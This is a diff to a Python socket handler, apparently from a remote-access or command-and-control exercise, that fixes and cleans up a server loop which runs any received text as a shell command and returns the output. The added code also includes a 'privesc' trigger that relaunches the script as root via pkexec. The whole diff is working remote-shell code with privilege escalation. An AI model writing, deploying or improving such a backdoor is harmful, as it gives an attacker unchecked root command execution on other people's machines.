@@ -95,51 +95,30 @@ def handle_conn(conn, addr):
                 data = conn.recv(1024)
                 if not data:
                     break
+                data = data.strip()
+
+                if data == b"privesc":
+                    subprocess.run(["chmod", "+x", THIS_FILE])
+                    subprocess.Popen(["pkexec", THIS_FILE])
+                    sys.exit(0) 
 
                 command = data.decode("utf-8", errors="replace").strip() 
                 if not command:
-                    break
-                print("received: " + command)
+                    continue
 
+                print("running: " + command)
                 result = run_command(command)
                 response = result.stdout + result.stderr
                 if not response: 
-                    response = f"Command executed. Exist code: {result.returncode}"
-                conn.sendall(response.encode("utf-8"), errors = "replace")
-
-                if command == "privesc":
-                    subprocess.run(["pkexec"], THIS_FILE)
-
-            except Exception as e:
-                conn.sendall(f"error: {str(e)}\n".encode("utf-8"))
+                    response = f"Command executed. Exit code: {result.returncode}"
+                conn.sendall(response.encode("utf-8", errors="replace"))
                 break
-
-
-
-        # Think VERY carefully about how you will communicate between the client and server
-        # You will need to make a custom protocol to transfer commands
             
-            # Process the communication data from 
-            
-        
-        
-command = data.decode("utf-8", errors = "replace").strip() 
-        
-
-        # Think VERY carefully about how you will communicate between the client and server
-        # You will need to make a custom protocol to transfer commands
-
-        try:
-            conn.sendall("Response data here".encode())
-            # Process the communication data from 
-
-            result = run_command(command) 
-            response = result.stdout + result.stderr
-            if not response: 
-                response = f"Command executed. Exist code: {result.returncode}"
-        
-        except Exception as e:
-            conn.sendall(f"error: {e}".encode())
+            except Exception as e:
+                error_msg = f"Error: {str(e)}\n"
+                conn.sendall(error_msg.encode("utf-8"))
+                break
+         
 
 
 def main():
